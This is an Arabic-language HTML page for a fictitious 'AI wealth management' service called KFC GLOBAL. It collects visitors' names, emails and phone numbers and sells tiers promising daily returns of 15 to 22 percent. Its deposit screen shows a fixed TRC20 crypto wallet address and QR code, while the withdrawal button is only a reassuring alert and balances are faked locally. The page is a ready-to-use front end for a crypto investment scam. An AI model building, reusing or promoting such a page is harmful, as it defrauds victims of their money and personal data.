<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>KFC GLOBAL - NEON ELITE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg: #010403; --glow: #00ff88; }
        body { background-color: var(--bg); color: white; font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* تأثير الزجاج الفاخر */
        .glass { background: rgba(10, 25, 20, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 136, 0.15); }
        
        /* تأثير النيون والميض للأيقونات */
        .neon-icon {
            color: var(--primary);
            filter: drop-shadow(0 0 10px var(--primary)) drop-shadow(0 0 20px var(--primary));
            animation: flicker 3s infinite alternate;
        }
        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; filter: drop-shadow(0 0 10px var(--primary)); }
            20%, 22%, 24%, 55% { opacity: 0.7; filter: none; }
        }

        /* حاوية الأيقونة الفخمة */
        .glow-box {
            width: 65px; height: 65px; border-radius: 22px;
            display: flex; align-items: center; justify-content: center;
            background: rgba(0, 255, 136, 0.05);
            border: 2px solid rgba(0, 255, 136, 0.2);
            box-shadow: inset 0 0 15px rgba(0, 255, 136, 0.1);
        }

        .nav-bottom { background: rgba(1, 4, 3, 0.95); position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 20px 0; border-top: 1px solid rgba(0, 255, 136, 0.2); z-index: 5000; }
        .nav-item { color: #3a5248; font-size: 10px; text-align: center; cursor: pointer; flex: 1; }
        .nav-item.active { color: var(--primary); }
        .nav-item.active i { filter: drop-shadow(0 0 8px var(--primary)); }

        .page { display: none; padding-bottom: 130px; animation: fadeIn 0.5s ease-out; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        .btn-premium { 
            background: linear-gradient(135deg, #00ff88 0%, #00bd65 100%); 
            color: #000; font-weight: 900; border-radius: 20px; padding: 18px; 
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
        }

        .tier-card { 
            background: linear-gradient(160deg, #08120e, #010403); 
            border-radius: 30px; border: 1px solid rgba(0, 255, 136, 0.1);
            transition: 0.3s;
        }
        .tier-card:active { transform: scale(0.95); border-color: var(--primary); }

        input { background: rgba(0,0,0,0.4) !important; border: 1px solid rgba(0, 255, 136, 0.1) !important; color: white !important; border-radius: 18px !important; padding: 16px !important; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
</head>
<body>

    <div id="auth-screen" class="page active flex flex-col min-h-screen px-8 justify-center">
        <div class="text-center mb-12">
            <div class="w-24 h-24 bg-green-500/10 rounded-[2.5rem] flex items-center justify-center mx-auto mb-6 border border-green-500/20 shadow-[0_0_40px_rgba(0,255,136,0.1)]">
                <i class="fas fa-microchip text-5xl neon-icon"></i>
            </div>
            <h1 class="text-4xl font-black italic tracking-tighter">KFC <span class="text-green-500">GLOBAL</span></h1>
            <p class="text-[10px] text-green-400 font-bold uppercase tracking-[4px] mt-2">AI Wealth Management</p>
        </div>
        <div class="space-y-4 max-w-sm mx-auto w-full">
            <input id="reg-name" type="text" placeholder="الاسم الثلاثي">
            <input id="reg-email" type="email" placeholder="البريد الإلكتروني">
            <input id="reg-phone" type="tel" placeholder="رقم الهاتف">
            <button onclick="handleLogin()" class="w-full btn-premium">تفعيل النظام <i class="fas fa-power-off ml-2"></i></button>
        </div>
    </div>

    <div id="main-app" style="display:none">
        
        <div id="page-home" class="page active px-5 pt-10">
            <div class="bg-gradient-to-r from-green-500/20 to-transparent p-6 rounded-[35px] mb-10 border border-green-500/20 relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[10px] text-gray-400 font-bold uppercase mb-1">الرصيد القابل للسحب</p>
                    <h3 class="text-5xl font-black italic">$<span id="balance">0.00</span></h3>
                </div>
                <i class="fas fa-bolt absolute -right-4 -top-4 text-green-500/10 text-9xl"></i>
            </div>

            <h4 class="font-black text-xl mb-6 flex items-center gap-2">
                <span class="w-2 h-8 bg-green-500 rounded-full"></span> 
                محافظ الاستثمار النشطة
            </h4>
            <div id="plans-container" class="space-y-5"></div>
        </div>

        <div id="page-profile" class="page px-6 pt-10">
            <div class="glass p-10 rounded-[50px] text-center border-b-4 border-green-500">
                <div class="glow-box mx-auto mb-6">
                    <i class="fas fa-user-shield text-3xl neon-icon"></i>
                </div>
                <h2 id="p-name" class="text-2xl font-black"></h2>
                <p id="p-phone" class="text-green-500 text-xs font-bold mb-8"></p>
                
                <div class="grid grid-cols-2 gap-4 mb-10">
                    <button onclick="switchPage('recharge')" class="bg-green-500 text-black py-4 rounded-2xl font-black text-xs">إيداع جديد</button>
                    <button onclick="handleWithdrawRequest()" class="bg-white/5 py-4 rounded-2xl font-black text-xs border border-white/10">طلب سحب</button>
                </div>

                <div class="bg-black/40 p-5 rounded-3xl text-right space-y-4 border border-white/5">
                    <div class="flex justify-between text-xs"><span class="text-gray-500">حالة الحساب</span><span class="text-green-400 font-bold">نشط بالكامل</span></div>
                    <div class="flex justify-between text-xs"><span class="text-gray-500">التوثيق</span><span class="text-blue-400 font-bold">Level 3</span></div>
                </div>
                <button onclick="localStorage.clear(); location.reload();" class="mt-8 text-[10px] text-gray-600 font-bold uppercase tracking-widest">تسجيل الخروج</button>
            </div>
        </div>

        <div id="page-recharge" class="page px-6 pt-10 text-center">
            <div class="glass p-8 rounded-[45px]">
                <h2 class="text-xl font-black mb-8 text-green-500">بوابة الإيداع الآمنة</h2>
                <div class="bg-white p-4 w-44 h-44 mx-auto rounded-[35px] mb-8 shadow-[0_0_30px_rgba(0,255,136,0.2)]">
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2" class="w-full">
                </div>
                <div class="bg-black/60 p-5 rounded-2xl border border-green-500/20 font-mono text-[10px] mb-8 break-all text-green-400">TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2</div>
                <button onclick="navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2');alert('تم نسخ العنوان!')" class="btn-premium w-full">نسخ عنوان TRC20</button>
            </div>
        </div>

        <nav class="nav-bottom">
            <div class="nav-item active" onclick="switchPage('home', this)"><i class="fas fa-grid-2 text-xl block mb-1"></i>الخطط</div>
            <div class="nav-item" onclick="switchPage('recharge', this)"><i class="fas fa-wallet text-xl block mb-1"></i>شحن</div>
            <div class="nav-item" onclick="switchPage('profile', this)"><i class="fas fa-id-badge text-xl block mb-1"></i>حسابي</div>
        </nav>
    </div>

    <script>
        const tiers = [
            { id: 1, cost: 100, daily: 15, name: "Platinum Layer", icon: "fas fa-shield-virus" },
            { id: 2, cost: 300, daily: 55, name: "Diamond Elite", icon: "fas fa-gem" },
            { id: 3, cost: 600, daily: 130, name: "Emerald Prime", icon: "fas fa-crown" }
        ];

        function handleLogin() {
            const name = document.getElementById('reg-name').value;
            const email = document.getElementById('reg-email').value;
            const phone = document.getElementById('reg-phone').value;
            if(!name || !email) return alert("يرجى إكمال البيانات");
            const user = { name, email, phone, balance: 0 };
            localStorage.setItem('kfc_user', JSON.stringify(user));
            startApp(user);
        }

        function startApp(u) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'block';
            document.getElementById('balance').innerText = u.balance.toFixed(2);
            document.getElementById('p-name').innerText = u.name;
            document.getElementById('p-phone').innerText = u.phone;
            renderPlans();
        }

        function renderPlans() {
            document.getElementById('plans-container').innerHTML = tiers.map(t => `
                <div class="tier-card p-6 flex justify-between items-center" onclick="alert('يرجى شحن الرصيد أولاً لتفعيل ${t.name}')">
                    <div class="flex items-center gap-5">
                        <div class="glow-box">
                            <i class="${t.icon} text-3xl neon-icon"></i>
                        </div>
                        <div>
                            <p class="font-black text-sm uppercase text-white">${t.name}</p>
                            <p class="text-green-400 text-[10px] font-bold">الربح اليومي: $${t.daily}</p>
                        </div>
                    </div>
                    <div class="text-right">
                        <p class="text-white font-black italic">$${t.cost}</p>
                        <i class="fas fa-chevron-left text-[10px] text-gray-700"></i>
                    </div>
                </div>
            `).join('');
        }

        function switchPage(pId, el) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-' + pId).classList.add('active');
            if(el) {
                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
                el.classList.add('active');
            }
        }

        function handleWithdrawRequest() { alert("اذا كان لديك ارباح سوفا يتم  فحص الأرباح.. سيتم التحويل خلال 24 ساعة."); }

        window.onload = () => {
            const saved = localStorage.getItem('kfc_user');
            if(saved) startApp(JSON.parse(saved));
        };
    </script>
</body>
</html>
